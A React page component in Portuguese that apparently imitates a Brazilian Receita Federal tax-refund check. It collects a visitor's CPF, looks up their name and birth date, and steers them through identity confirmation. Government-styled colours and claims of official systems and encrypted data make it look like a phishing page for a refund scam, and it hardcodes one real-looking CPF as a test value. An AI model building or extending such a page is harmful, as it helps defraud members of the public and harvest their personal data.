import { useState, useEffect } from "react";
import { useQuery } from "@tanstack/react-query";
import { useLocation } from "wouter";
import { z } from "zod";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { FaInfoCircle } from "react-icons/fa";
import ImageVerification from "../components/ImageVerification";
import { useUserData } from "../contexts/UserContext";

// Validação de CPF
const cpfSchema = z.object({
  cpf: z.string()
    .min(11, {
      message: "CPF deve ter 11 dígitos",
    })
    .max(14)
    .transform(val => val.replace(/\D/g, "")) // Remove caracteres não numéricos
    .refine(val => val.length === 11, {
      message: "CPF deve ter 11 dígitos",
    })
});

type CpfFormType = z.infer<typeof cpfSchema>;

export default function VerificarRestituicao() {
  const [, navigate] = useLocation();
  const [cpfConsultado, setCpfConsultado] = useState("");
  const [showVerificacao, setShowVerificacao] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [imageVerified, setImageVerified] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  
  // Usar o contexto de usuário
  const { userData, updateUserData, clearUserData } = useUserData();
  
  // Formulário de CPF
  const form = useForm<CpfFormType>({
    resolver: zodResolver(cpfSchema),
    defaultValues: {
      cpf: "",
    },
  });

  // Query para consultar os dados do CPF
  const { data: dadosPessoais, isLoading, isError, error, refetch } = useQuery({
    queryKey: ["cpf", cpfConsultado],
    queryFn: async () => {
      if (!cpfConsultado) return null;
      
      try {
        const response = await apiRequest(
          "GET", 
          `/api/consulta-cpf?cpf=${cpfConsultado}`
        );
        
        // Verificamos a resposta e analisamos possíveis erros
        if (!response.ok) {
          // Tentamos obter o corpo do erro para informações detalhadas
          const errorBody = await response.json().catch(() => ({}));
          
          // Obtemos a mensagem personalizada do servidor
          const errorMessage = errorBody.error || "Erro ao consultar CPF";
          console.error("Erro na consulta de CPF:", errorMessage);
          
          throw new Error(errorMessage);
        }
        
        const data = await response.json();
        
        // Verificamos se os dados contêm as propriedades necessárias
        if (!data.Result || !data.Result.NomePessoaFisica || !data.Result.DataNascimento) {
          throw new Error("Dados incompletos retornados pela API");
        }
        
        return data;
      } catch (error) {
        console.error("Erro ao consultar CPF:", error);
        throw error;
      }
    },
    enabled: !!cpfConsultado,
    refetchOnWindowFocus: false,
    retry: 1, // Limita a 1 tentativa de retry para não sobrecarregar a API
  });

  const formatCPF = (cpf: string) => {
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  };

  const onSubmit = (data: CpfFormType) => {
    // Verificar se a imagem foi selecionada corretamente
    if (!imageVerified) {
      toast({
        title: "Verificação necessária",
        description: "Por favor, clique na figura da TESOURA para continuar.",
        variant: "destructive"
      });
      return;
    }
    
    // Limpar mensagens de erro anteriores
    setErrorMessage("");
    
    const cpfLimpo = data.cpf.replace(/\D/g, "");
    setCpfConsultado(cpfLimpo);
    
    // Limpar dados anteriores
    clearUserData();
    
    // Salvar o CPF no contexto do usuário
    updateUserData({
      cpf: cpfLimpo
    });
    
    // Ir para a página de confirmação de identidade sem passar o CPF na URL
    navigate('/confirmar-identidade');
  };

  const { toast } = useToast();
  
  // Efeito para monitorar dados e erros
  useEffect(() => {
    if (!cpfConsultado) return;
    
    // Quando temos dados, exibimos a verificação (exceto para o CPF de teste que já é exibido no onSubmit)
    if (dadosPessoais && dadosPessoais.Result && cpfConsultado !== "11548718785") {
      setShowVerificacao(true);
    }
    
    // Quando temos um erro, exibimos uma mensagem
    if (isError) {
      const errorMsg = error instanceof Error 
        ? error.message 
        : "Não foi possível consultar o CPF no momento. Tente novamente mais tarde.";
      
      setErrorMessage(errorMsg);
      setShowVerificacao(false);
      
      toast({
        title: "Erro na consulta",
        description: errorMsg,
        variant: "destructive"
      });
    }
  }, [dadosPessoais, isError, error, cpfConsultado, toast]);

  const handleVerificacaoConcluida = (dadosConfirmados: any) => {
    console.log("Verificação concluída, dados recebidos:", dadosConfirmados);
    
    // Garantir que todos os dados necessários estão presentes
    const nome = dadosConfirmados.nome || "";
    const dataNasc = dadosConfirmados.dataNascimento || "";
    const companhia = dadosConfirmados.companhia || "";
    const estado = dadosConfirmados.estado || "";
    
    // Atualizar o contexto do usuário com os dados confirmados
    updateUserData({
      nome: nome,
      dataNascimento: dataNasc,
      companhia: companhia,
      estado: estado
    });
    
    console.log("Dados armazenados no contexto, navegando para resultado");
    
    // Navegar para a página de resultados (sem parâmetros na URL)
    navigate('/resultado');
  };

  return (
    <div className="flex flex-col min-h-screen">
      <Header />
      <main className="flex-1 bg-[var(--gov-gray-light)] py-12">
        <div className="container mx-auto px-4">
          <div className="max-w-2xl mx-auto">
            <Card className="shadow-md">
              <CardHeader className="bg-[var(--gov-blue)] text-white text-center py-6">
                <CardTitle className="text-2xl font-bold">Verificar Direito à Restituição</CardTitle>
                <CardDescription className="text-gray-100 mt-2">
                  Informe seu CPF para consultar seus valores
                </CardDescription>
              </CardHeader>
              <CardContent className="p-6">
                <div className="p-4">
                  <p className="mb-4">Para verificar se você tem direito à restituição informe os dados abaixo e clique em enviar:</p>
                  
                  <Form {...form}>
                    <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                      <FormField
                        control={form.control}
                        name="cpf"
                        render={({ field }) => (
                          <FormItem className="mb-4">
                            <FormLabel className="flex items-center mb-1">
                              <span>CPF:</span>
                              <span className="required-star text-red-600 ml-1">*</span>
                              <span className="ml-1 text-red-500 flex items-center">
                                <FaInfoCircle size={14} />
                              </span>
                            </FormLabel>
                            <FormControl>
                              <Input
                                placeholder="___.___.___-__"
                                {...field}
                                className="w-full border border-gray-300 p-2 text-base text-[#333] tracking-wide"
                                onChange={(e) => {
                                  // Formata o CPF enquanto o usuário digita
                                  let value = e.target.value.replace(/\D/g, "");
                                  if (value.length <= 11) {
                                    if (value.length > 9) {
                                      value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
                                    } else if (value.length > 6) {
                                      value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
                                    } else if (value.length > 3) {
                                      value = value.replace(/(\d{3})(\d{1,3})/, "$1.$2");
                                    }
                                    field.onChange(value);
                                  }
                                }}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                      
                      {/* Verificação com imagens */}
                      <ImageVerification onVerify={(success) => setImageVerified(success)} />
                    
                      <div className="text-center">
                        <Button 
                          type="submit" 
                          className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
                          disabled={isLoading || !imageVerified}
                        >
                          <i className="fas fa-arrow-right mr-2"></i>
                          <span>{isLoading ? "Consultando..." : "Prosseguir"}</span>
                        </Button>
                      </div>
                      
                      {isError && (
                        <div className="text-red-600 text-center mt-4 p-3 bg-red-50 rounded-md">
                          {errorMessage || "Não foi possível verificar o CPF. Por favor, tente novamente."}
                        </div>
                      )}
                      
                      {isLoading && (
                        <div className="text-blue-600 text-center mt-4 p-3 bg-blue-50 rounded-md">
                          Consultando informações do CPF. Por favor, aguarde...
                        </div>
                      )}
                    </form>
                  </Form>
                  
                  {/* Requisitos de segurança */}
                  <div className="mt-8 bg-[var(--gov-gray-light)] p-4 rounded-md border border-[var(--gov-gray)]">
                    <h3 className="text-[var(--gov-blue-dark)] font-semibold mb-2">Informações de Segurança:</h3>
                    <ul className="text-sm text-[var(--gov-gray-dark)] space-y-2">
                      <li>• Seus dados são protegidos e criptografados.</li>
                      <li>• A consulta é feita nos sistemas oficiais da Receita Federal.</li>
                      <li>• É necessário confirmar sua identidade para prosseguir.</li>
                      <li>• Não compartilhamos seus dados com terceiros.</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </main>
      
      {/* Popup de verificação de identidade - totalmente removido */}
      
      {/* O popup de carregamento foi removido */}
      
      <Footer />
    </div>
  );
}